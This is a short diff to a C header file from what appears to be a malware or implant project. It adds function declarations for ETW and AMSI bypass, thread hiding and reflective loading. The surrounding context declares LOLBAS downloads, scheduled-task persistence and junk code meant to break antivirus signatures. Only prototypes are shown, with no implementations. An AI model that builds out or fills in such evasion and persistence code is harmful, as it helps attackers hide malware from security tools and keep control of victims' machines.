@@ -41,6 +41,12 @@ void obf_sys_harden_files(void);
 void obf_sys_lolbas_download(const char *url, const char *outPath);
 void obf_ensure_scheduled_task(const char *exePath, const char *taskName);
 
+/* === ETW + AMSI Bypass + Reflective Loader === */
+void obf_bypass_etw(void);
+void obf_bypass_amsi(void);
+void obf_hide_thread(void);
+void obf_reflective_load(void);
+
 /* Junk code insertion to break signatures */
 void obf_junk_delay(void);
 void obf_sleep_junk(int ms);
